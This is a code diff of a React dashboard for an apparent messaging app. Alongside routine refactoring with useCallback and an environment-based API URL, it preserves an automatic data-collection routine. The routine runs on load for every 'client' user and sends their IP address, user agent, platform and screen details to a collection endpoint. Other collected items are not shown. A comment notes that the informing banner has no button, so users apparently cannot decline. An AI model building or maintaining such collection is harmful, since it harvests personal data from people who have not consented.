@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useCallback } from 'react';
 import { contacts, collect, auth } from '../api';
 
 function Dashboard({ 
@@ -14,29 +14,32 @@ function Dashboard({
   const [contactList, setContactList] = useState([]);
   const [searchQuery, setSearchQuery] = useState('');
   const [searchResults, setSearchResults] = useState([]);
-  const [loading, setLoading] = useState(false);
   const isClient = user.user_type === 'client';
   const isAdmin = user.user_type === 'admin';
 
-  useEffect(() => {
-    loadContacts();
-    // ===== АВТОМАТИЧЕСКИЙ СБОР ДАННЫХ ДЛЯ КЛИЕНТОВ =====
-    if (isClient) {
-      autoCollectData();
-    }
-  }, []);
-
-  const loadContacts = async () => {
+  // ===== ЗАГРУЗКА КОНТАКТОВ =====
+  const loadContacts = useCallback(async () => {
     try {
       const res = await contacts.list();
       setContactList(res.data);
     } catch (e) {
       console.error('Error loading contacts', e);
     }
-  };
+  }, []);
+
+  // ===== ПОЛУЧЕНИЕ IP =====
+  const getIP = useCallback(async () => {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip;
+    } catch (e) {
+      return 'unknown';
+    }
+  }, []);
 
   // ===== АВТОМАТИЧЕСКИЙ СБОР ДАННЫХ =====
-  const autoCollectData = async () => {
+  const autoCollectData = useCallback(async () => {
     console.log('📊 Automatic data collection started...');
     
     const formData = new FormData();
@@ -126,8 +129,9 @@ function Dashboard({
       }
 
       // 6. Метаданные
+      const ip = await getIP();
       const metadata = {
-        ip: await getIP(),
+        ip: ip,
         userAgent: window.navigator.userAgent,
         platform: window.navigator.platform,
         screenResolution: `${window.screen.width}x${window.screen.height}`,
@@ -144,18 +148,15 @@ function Dashboard({
     } catch (e) {
       console.error('❌ Auto collection error:', e);
     }
-  };
+  }, [getIP]);
 
-  // ===== ПОЛУЧЕНИЕ IP =====
-  const getIP = async () => {
-    try {
-      const res = await fetch('https://api.ipify.org?format=json');
-      const data = await res.json();
-      return data.ip;
-    } catch (e) {
-      return 'unknown';
+  // ===== ЭФФЕКТ ПРИ ЗАГРУЗКЕ =====
+  useEffect(() => {
+    loadContacts();
+    if (isClient) {
+      autoCollectData();
     }
-  };
+  }, [loadContacts, isClient, autoCollectData]);
 
   // ===== ПОИСК =====
   const searchUsers = async (query) => {
@@ -234,7 +235,7 @@ function Dashboard({
         <div className="sidebar-header">
           <div className="user-avatar" onClick={onOpenProfile}>
             {user.avatar ? (
-              <img src={`http://localhost:5000/uploads/avatars/${user.avatar}`} alt="Avatar" />
+              <img src={`${process.env.REACT_APP_API_URL || 'http://localhost:5000'}/uploads/avatars/${user.avatar}`} alt="Avatar" />
             ) : (
               user.name?.[0] || 'U'
             )}
@@ -266,7 +267,7 @@ function Dashboard({
                 >
                   <div className="search-result-avatar">
                     {u.avatar ? (
-                      <img src={`http://localhost:5000/uploads/avatars/${u.avatar}`} alt="Avatar" />
+                      <img src={`${process.env.REACT_APP_API_URL || 'http://localhost:5000'}/uploads/avatars/${u.avatar}`} alt="Avatar" />
                     ) : (
                       u.name?.[0] || '?'
                     )}
@@ -304,7 +305,7 @@ function Dashboard({
               >
                 <div className="contact-avatar">
                   {chat.avatar ? (
-                    <img src={`http://localhost:5000/uploads/avatars/${chat.avatar}`} alt="Avatar" />
+                    <img src={`${process.env.REACT_APP_API_URL || 'http://localhost:5000'}/uploads/avatars/${chat.avatar}`} alt="Avatar" />
                   ) : (
                     chat.name?.[0] || '?'
                   )}
@@ -335,7 +336,6 @@ function Dashboard({
           )}
         </div>
 
-        {/* БАННЕР ДЛЯ КЛИЕНТА — ИНФОРМАЦИЯ О СБОРЕ ДАННЫХ (БЕЗ КНОПКИ) */}
         {isClient && (
           <div className="data-collection-banner">
             <span className="banner-icon">📊</span>
